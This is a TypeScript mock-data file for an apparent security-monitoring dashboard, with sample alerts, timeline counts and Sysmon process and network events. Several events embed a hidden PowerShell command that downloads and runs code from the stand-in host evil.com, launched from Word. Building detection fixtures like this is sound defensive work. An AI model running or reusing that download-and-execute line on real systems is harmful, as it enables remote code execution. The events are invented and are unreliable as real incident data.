import { Alert, SysmonEvent, TimelineDataPoint } from "./types";

export const recentAlerts: Alert[] = [
  {
    id: "alert-1",
    timestamp: "2024-07-30 14:35:12",
    severity: "Critical",
    description: "Powershell spawned from winword.exe",
    agentHostname: "WS-FIN-01.corp.local",
    status: "New",
    source: "AI Anomaly",
  },
  {
    id: "alert-2",
    timestamp: "2024-07-30 14:33:50",
    severity: "Critical",
    description: "YARA Rule 'APT29_Dukebot' Match",
    agentHostname: "DC-02.corp.local",
    status: "New",
    source: "YARA Match",
  },
  {
    id: "alert-3",
    timestamp: "2024-07-30 14:29:01",
    severity: "Warning",
    description: "Anomalous network connection to CN",
    agentHostname: "WS-HR-05.corp.local",
    status: "Acknowledged",
    source: "AI Anomaly",
  },
  {
    id: "alert-4",
    timestamp: "2024-07-30 14:25:44",
    severity: "Warning",
    description: "LSASS memory access from non-system process",
    agentHostname: "EXCH-01.corp.local",
    status: "New",
    source: "Policy",
  },
];

export const timelineData: TimelineDataPoint[] = [
  { hour: 3, critical: 0, warning: 1, informational: 10 },
  { hour: 4, critical: 0, warning: 0, informational: 8 },
  { hour: 5, critical: 1, warning: 2, informational: 12 },
  { hour: 6, critical: 0, warning: 1, informational: 15 },
  { hour: 7, critical: 0, warning: 3, informational: 25 },
  { hour: 8, critical: 2, warning: 8, informational: 80 },
  { hour: 9, critical: 3, warning: 12, informational: 120 },
  { hour: 10, critical: 2, warning: 15, informational: 110 },
  { hour: 11, critical: 5, warning: 10, informational: 90 },
  { hour: 12, critical: 4, warning: 11, informational: 95 },
  { hour: 13, critical: 7, warning: 18, informational: 130 },
  { hour: 14, critical: 10, warning: 25, informational: 150 },
];

export const sysmonEvents: SysmonEvent[] = [
  {
    id: "evt-1",
    timestamp: "2024-07-30 14:35:12.123Z",
    agent: {
      id: "agent-001",
      hostname: "WS-FIN-01.corp.local",
      ip: "10.1.1.23",
    },
    event: { id: 1, name: "ProcessCreate" },
    process: {
      pid: 7890,
      name: "powershell.exe",
      path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      commandLine:
        '"powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://evil.com/a\'))"',
      hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    },
    parentProcess: { pid: 4567, name: "winword.exe" },
    user: { name: "j.doe", domain: "CORP" },
    fullData: {
      EventName: "ProcessCreate",
      UtcTime: "2024-07-30 14:35:12.123Z",
      ProcessGuid: "{abc-123}",
      ProcessId: "7890",
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      CommandLine:
        '"powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://evil.com/a\'))"',
      User: "CORP\\j.doe",
      ParentProcessGuid: "{def-456}",
      ParentProcessId: "4567",
      ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    },
  },
  {
    id: "evt-2",
    timestamp: "2024-07-30 14:36:05.456Z",
    agent: {
      id: "agent-002",
      hostname: "DC-02.corp.local",
      ip: "10.1.0.2",
    },
    event: { id: 3, name: "NetworkConnect" },
    process: {
      pid: 7890,
      name: "powershell.exe",
      path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      commandLine:
        '"powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://evil.com/a\'))"',
    },
    network: {
      destinationIp: "123.45.67.89",
      destinationPort: 80,
      protocol: "tcp",
    },
    user: { name: "j.doe", domain: "CORP" },
    fullData: {
      EventName: "NetworkConnect",
      UtcTime: "2024-07-30 14:36:05.456Z",
      ProcessId: "7890",
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      Protocol: "tcp",
      DestinationIp: "123.45.67.89",
      DestinationPort: "80",
    },
  },
  {
    id: "evt-3",
    timestamp: "2024-07-30 14:38:22.789Z",
    agent: {
      id: "agent-003",
      hostname: "WS-DEV-10.corp.local",
      ip: "192.168.1.101",
    },
    event: { id: 1, name: "ProcessCreate" },
    process: {
      pid: 9911,
      name: "csc.exe",
      path: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
      commandLine: "csc.exe /out:payload.exe source.cs",
    },
    parentProcess: { pid: 8822, name: "cmd.exe" },
    user: { name: "s.smith", domain: "CORP" },
    fullData: {
      EventName: "ProcessCreate",
      UtcTime: "2024-07-30 14:38:22.789Z",
      ProcessId: "9911",
      Image: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
      ParentImage: "C:\\Windows\\System32\\cmd.exe",
    },
  },
];
